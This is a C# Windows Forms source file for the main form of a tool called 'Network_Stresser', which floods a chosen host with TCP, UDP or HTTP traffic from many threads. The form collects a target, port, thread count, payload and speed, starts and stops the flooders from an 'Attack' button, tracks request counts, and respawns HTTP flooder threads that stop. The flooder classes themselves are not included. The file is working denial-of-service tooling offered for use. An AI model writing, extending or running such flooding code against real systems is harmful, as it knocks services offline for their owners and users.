using System;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace Network_Stresser
{
	public partial class frmMain : Form
	{
		#region Fields
		private bool attack;
		private static IFlooder[] arr;

		private static string sIP, sData, sSubsite;
		private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
		private static bool bResp, intShowStats;
		#endregion

		#region Constructors
		public frmMain()
		{
			InitializeComponent();
		}
		#endregion

		#region Event handlers
		private void frmMain_Load(object sender, EventArgs e)
		{
			this.Text = String.Format("{0} v. {1}", Application.ProductName, Application.ProductVersion);
            cbMethod.SelectedIndex = 0;
		}

		private void cmdAttack_Click(object sender, EventArgs e)
		{
            string host = txtTarget.Text.ToLower();
            //if (host.Length == 0)
            //{
            //    MessageBox.Show(null, "Empty Host or IP.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            //    return;
            //}
            try
            {
                bool match = false;
                IPAddress[] addresses = Dns.GetHostEntry(host).AddressList;
                if ("127.0.0.1" == txtTarget.Text || "localhost" == txtTarget.Text)
                {
                    match = true;
                }
                else
                {
                    for (int i = 0; i < addresses.Length; i++)
                    {
                        if (addresses[i].AddressFamily == AddressFamily.InterNetwork && addresses[i].ToString() == txtTarget.Text)
                        {
                            match = true;
                        }
                    }
                }
                if (!match)
                {
                    for (int i = 0; i < addresses.Length; i++)
                    {
                        if (addresses[i].AddressFamily == AddressFamily.InterNetwork)
                        {
                            txtTarget.Text = addresses[i].ToString();
                            break;
                        }
                    }
                }
                if (!attack)
                {
                    attack = true;
                    try
                    {
                        sIP = txtTarget.Text;

                        if (!Int32.TryParse(txtPort.Text, out iPort))
                            throw new Exception("Enter a correct port.");

                        if (!Int32.TryParse(txtThreads.Text, out iThreads))
                            throw new Exception("Enter a correct threads number.");

                        if (String.IsNullOrEmpty(txtTarget.Text))
                            throw new Exception("Select a target.");

                        iProtocol = 0;
                        switch (cbMethod.Text)
                        {
                            case "TCP": iProtocol = 1; break;
                            case "UDP": iProtocol = 2; break;
                            case "HTTP": iProtocol = 3; break;
                            default: throw new Exception("Select a proper attack method.");
                        }

                        sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
                        if (String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
                            throw new Exception("Enter a content to spam.");

                        if (!txtSubsite.Text.StartsWith("/") && (iProtocol == 3))
                            throw new Exception("Enter a subsite (for example \"/\")");
                        else
                            sSubsite = txtSubsite.Text;

                        if (!Int32.TryParse(txtTimeout.Text, out iTimeout))
                            throw new Exception("Enter a timeout.");

                        bResp = chkWaitReply.Checked;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(null, ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        attack = false;
                        return;
                    }

                    cmdAttack.Text = "Stop";

                    switch (iProtocol)
                    {
                        case 1:
                        case 2:
                            {
                                arr = Enumerable.Range(0, iThreads)
                                    .Select(i => new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData))
                                    .ToArray();
                                break;
                            }
                        case 3:
                            {
                                arr = Enumerable.Range(0, iThreads)
                                    .Select(i => new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout))
                                    .ToArray();
                                break;
                            }
                    }

                    foreach (IFlooder f in arr)
                    {
                        f.Start();
                    }
                    tShowStats.Start();
                }
                else
                {
                    attack = false;
                    cmdAttack.Text = "Start";

                    foreach (IFlooder f in arr)
                    {
                        f.Stop();
                    }
                    tShowStats.Stop();

                    arr = null;
                }

                cbMethod.Enabled = !attack;
                txtTarget.Enabled = !attack;
                txtPort.Enabled = !attack;
                txtSubsite.Enabled = !attack;
                txtData.Enabled = !attack;
                txtTimeout.Enabled = !attack;
                txtThreads.Enabled = !attack;
                chkWaitReply.Enabled = !attack;
                tbSpeed.Enabled = !attack;
            }
            catch
            {
                MessageBox.Show(null, "Enter a correct host.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
		}

		private void tShowStats_Tick(object sender, EventArgs e)
		{
			if (intShowStats) return; intShowStats = true;

			bool isFlooding = false;
			switch (iProtocol)
			{
				case 1:
				case 2:
					{
						int iFloodCount = arr.Cast<XXPFlooder>().Sum(f => f.FloodCount);
						tssRequested.Text = "Requested: " + iFloodCount.ToString(CultureInfo.InvariantCulture);
						break;
					}
				case 3:
					{
						int iIdle = 0;
						int iConnecting = 0;
						int iRequesting = 0;
						int iDownloading = 0;
						int iDownloaded = 0;
						int iRequested = 0;
						int iFailed = 0;

						for (int a = 0; a < arr.Length; a++)
						{
							HTTPFlooder httpFlooder = (HTTPFlooder)arr[a];
							iDownloaded += httpFlooder.Downloaded;
							iRequested += httpFlooder.Requested;
							iFailed += httpFlooder.Failed;
							switch (httpFlooder.State)
							{
								case ReqState.Ready:
								case ReqState.Completed:
									{
										iIdle++;
										break;
									}
								case ReqState.Connecting:
									{
										iConnecting++;
										break;
									}
								case ReqState.Requesting:
									{
										iRequesting++;
										break;
									}
								case ReqState.Downloading:
									{
										iDownloading++;
										break;
									}
							}
							if (isFlooding && !httpFlooder.IsFlooding)
							{
								int iaDownloaded = httpFlooder.Downloaded;
								int iaRequested = httpFlooder.Requested;
								int iaFailed = httpFlooder.Failed;
								httpFlooder = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout)
								{
									Downloaded = iaDownloaded,
									Requested = iaRequested,
									Failed = iaFailed
								};
								httpFlooder.Start();
								arr[a] = httpFlooder;
							}
						}
						tssFailed.Text = "Failed: " + iFailed.ToString(CultureInfo.InvariantCulture);
						tssRequested.Text = "Requested: " + iRequested.ToString(CultureInfo.InvariantCulture);
						//lbDownloaded.Text = iDownloaded.ToString(CultureInfo.InvariantCulture);
						//lbDownloading.Text = iDownloading.ToString(CultureInfo.InvariantCulture);
						//lbRequesting.Text = iRequesting.ToString(CultureInfo.InvariantCulture);
						//lbConnecting.Text = iConnecting.ToString(CultureInfo.InvariantCulture);
						//lbIdle.Text = iIdle.ToString(CultureInfo.InvariantCulture);
						break;
					}
			}

			intShowStats = false;
		}

		private void tbSpeed_ValueChanged(object sender, EventArgs e)
		{
			iDelay = tbSpeed.Value;
			if (arr != null)
			{
				foreach (var f in arr)
				{
					f.Delay = iDelay;
				}
			}
		}
		#endregion

        private void chkAdvanced_CheckedChanged(object sender, EventArgs e)
        {
            switch (chkAdvanced.Checked)
            {
                case true:
                    this.Height = 270;
                    break;
                case false:
                    this.Height = 128;
                    break;
            }

        }

        private void frmMain_Resize(object sender, EventArgs e)
        {
            if (this.Height > 128)
            {
                chkAdvanced.Checked = true;
            }
            else if (this.Height < 270)
            {
                chkAdvanced.Checked = false;
            }
            chkAdvanced_CheckedChanged(this, null);
        }
	}
}
